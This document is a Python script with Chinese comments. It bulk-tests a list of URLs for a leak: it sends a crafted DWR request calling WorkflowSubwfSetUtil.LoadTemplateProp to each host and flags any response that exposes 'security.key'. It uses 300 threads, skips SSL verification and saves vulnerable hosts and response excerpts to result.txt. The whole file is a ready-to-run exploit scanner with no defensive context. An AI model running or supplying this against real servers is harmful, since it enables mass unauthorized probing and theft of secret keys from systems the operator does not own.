import requests
import urllib3
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin
import sys

# 禁用SSL警告和验证
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 线程锁用于安全写入文件
file_lock = threading.Lock()

def check_vulnerability(url):
    """
    检查单个URL是否存在漏洞
    """
    try:
        # 确保URL格式正确
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        # 构造目标URL
        target_url = urljoin(url.rstrip('/'), '/dwr/call/plaincall/')
        
        # 准备POST参数
        params = {
            'callCount': '1',
            'c0-id': '1',
            'c0-scriptName': 'WorkflowSubwfSetUtil',
            'c0-methodName': 'LoadTemplateProp',
            'batchId': 'a',
            'c0-param0': 'string:mobilemode',
            'scriptSessionId': '1',
            'a': '.swf'
        }
        
        # 发送请求，禁用SSL验证，禁止重定向
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        response = requests.post(
            target_url,
            params=params,
            headers=headers,
            verify=False,
            allow_redirects=False,  # 禁止重定向
            timeout=10
        )
        
        status_code = response.status_code
        
        # 检查状态码
        if 300 <= status_code < 400:
            # 3xx状态码，认为不存在漏洞
            print(f"[INFO] {url} - 状态码 {status_code}，不存在漏洞")
            return None
        
        elif status_code == 200:
            # 检查响应内容是否包含security.key
            if 'security.key' in response.text:
                result = {
                    'url': url,
                    'target_url': target_url,
                    'status_code': status_code,
                    'response_preview': response.text[:500]  # 只取前500字符作为预览
                }
                print(f"[VULNERABLE] {url} - 存在漏洞!")
                return result
            else:
                print(f"[INFO] {url} - 状态码 200，但响应不包含security.key")
                return None
        else:
            print(f"[INFO] {url} - 状态码 {status_code}，不存在漏洞")
            return None
            
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] {url} - 请求失败: {str(e)}")
        return None
    except Exception as e:
        print(f"[ERROR] {url} - 发生错误: {str(e)}")
        return None

def write_result(result):
    """
    将漏洞结果写入文件（线程安全）
    """
    with file_lock:
        with open('result.txt', 'a', encoding='utf-8') as f:
            f.write("=" * 60 + "\n")
            f.write(f"存在漏洞的URL: {result['url']}\n")
            f.write(f"目标地址: {result['target_url']}\n")
            f.write(f"状态码: {result['status_code']}\n")
            f.write("响应预览:\n")
            f.write(result['response_preview'] + "\n")
            f.write("=" * 60 + "\n\n")

def main():
    # 读取URL列表
    try:
        with open('url.txt', 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[ERROR] 未找到url.txt文件")
        return
    except Exception as e:
        print(f"[ERROR] 读取url.txt文件失败: {str(e)}")
        return
    
    if not urls:
        print("[INFO] url.txt中没有找到URL")
        return
    
    print(f"[INFO] 共读取到 {len(urls)} 个URL")
    print("[INFO] 开始漏洞检测，线程数: 300")
    print("-" * 60)
    
    # 清空或创建结果文件
    with open('result.txt', 'w', encoding='utf-8') as f:
        f.write("漏洞检测结果\n")
        f.write("=" * 60 + "\n\n")
    
    # 使用线程池并发执行
    vulnerable_count = 0
    
    with ThreadPoolExecutor(max_workers=300) as executor:
        # 提交所有任务
        future_to_url = {executor.submit(check_vulnerability, url): url for url in urls}
        
        # 处理完成的任务
        for future in as_completed(future_to_url):
            url = future_to_url[future]
            try:
                result = future.result()
                if result:
                    write_result(result)
                    vulnerable_count += 1
            except Exception as e:
                print(f"[ERROR] 处理 {url} 时发生异常: {str(e)}")
    
    print("-" * 60)
    print(f"[INFO] 检测完成!")
    print(f"[INFO] 共发现 {vulnerable_count} 个存在漏洞的URL")
    print(f"[INFO] 结果已保存到 result.txt")

if __name__ == "__main__":
    main()